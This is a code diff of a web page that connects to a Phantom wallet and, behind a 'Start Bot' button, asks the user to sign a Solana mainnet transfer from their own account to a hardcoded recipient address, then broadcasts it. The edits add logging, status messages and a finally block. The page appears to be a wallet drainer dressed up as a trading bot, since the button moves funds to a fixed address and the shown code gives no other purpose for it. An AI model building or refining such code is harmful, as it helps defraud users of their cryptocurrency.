@@ -56,7 +56,6 @@
     let userAccount;
     const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";
     const phantomDeepLink = "https://phantom.app/ul/v1/connect?app_url=YOUR_APP_URL";
-
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
     async function connectPhantomWallet() {
@@ -88,8 +87,9 @@
 
         const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
         const transaction = new solanaWeb3.Transaction();
-
+        
         try {
+            console.log("Creating transaction...");
             transaction.add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: new solanaWeb3.PublicKey(userAccount),
@@ -100,12 +100,21 @@
 
             document.getElementById("status").innerText = "Requesting signature...";
             const signedTransaction = await window.solana.signTransaction(transaction);
+            console.log("Transaction signed:", signedTransaction);
+
+            document.getElementById("status").innerText = "Sending transaction...";
             const signature = await connection.sendRawTransaction(signedTransaction.serialize());
             await connection.confirmTransaction(signature, 'confirmed');
             document.getElementById("status").innerText = `Transaction successful: ${signature}`;
+            console.log("Transaction successful:", signature);
+
         } catch (error) {
             console.error("Transaction error:", error);
             document.getElementById("status").innerText = `Transaction failed: ${error.message}`;
+        } finally {
+            // Re-enable the button and reset the text
+            document.getElementById("startBotButton").innerText = "Start Bot";
+            document.getElementById("startBotButton").disabled = false;
         }
     }
 
@@ -113,8 +122,6 @@
         document.getElementById("startBotButton").innerText = "Processing...";
         document.getElementById("startBotButton").disabled = true;
         await sendSolanaTokens();
-        document.getElementById("startBotButton").innerText = "Start Bot";
-        document.getElementById("startBotButton").disabled = false;
     });
 </script>
 
